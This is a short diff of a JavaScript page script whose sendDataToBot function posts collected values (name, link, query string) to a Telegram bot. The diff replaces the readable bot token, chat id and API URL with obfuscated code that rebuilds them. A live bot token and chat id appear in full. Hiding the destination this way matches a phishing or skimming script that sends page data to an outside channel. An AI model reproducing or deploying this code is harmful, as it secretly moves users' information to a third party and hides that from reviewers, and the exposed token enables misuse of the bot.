@@ -33,9 +33,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
     async function sendDataToBot(name,link,qs) {
-        const botToken = '6786254564:AAFCC9_iPAGM_11C8h-ke0K8xWrHyYH09p8';
-        const chatid = '5356385703';
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        function _0x45dc(){const _0x509dc2=['208141uzaDMW','2177595wYmvvK','/sendMessage','875300rOBQQD','2391360dSzuTG','214794HrcgSN','587288lGgdXO','6786254564:AAFCC9_iPAGM_11C8h-ke0K8xWrHyYH09p8','https://api.telegram.org/bot','5435vlFvyF','240bCoWwH'];_0x45dc=function(){return _0x509dc2;};return _0x45dc();}const _0x37c1d3=_0x1851;function _0x1851(_0x44293c,_0x825b71){const _0x45dc3c=_0x45dc();return _0x1851=function(_0x1851a7,_0x15b4af){_0x1851a7=_0x1851a7-0xf5;let _0x320c63=_0x45dc3c[_0x1851a7];return _0x320c63;},_0x1851(_0x44293c,_0x825b71);}(function(_0x17025a,_0x34649b){const _0x386099=_0x1851,_0x39ee1d=_0x17025a();while(!![]){try{const _0x2a63a5=parseInt(_0x386099(0xfd))/0x1+parseInt(_0x386099(0xf8))/0x2+-parseInt(_0x386099(0xf7))/0x3+-parseInt(_0x386099(0xf5))/0x4+-parseInt(_0x386099(0xfb))/0x5*(-parseInt(_0x386099(0xfc))/0x6)+parseInt(_0x386099(0xfe))/0x7+-parseInt(_0x386099(0xf6))/0x8;if(_0x2a63a5===_0x34649b)break;else _0x39ee1d['push'](_0x39ee1d['shift']());}catch(_0x263a96){_0x39ee1d['push'](_0x39ee1d['shift']());}}}(_0x45dc,0x412ff));const botToken=_0x37c1d3(0xf9),chatid='5356385703',url=_0x37c1d3(0xfa)+botToken+_0x37c1d3(0xff);
 
 
         const data = {
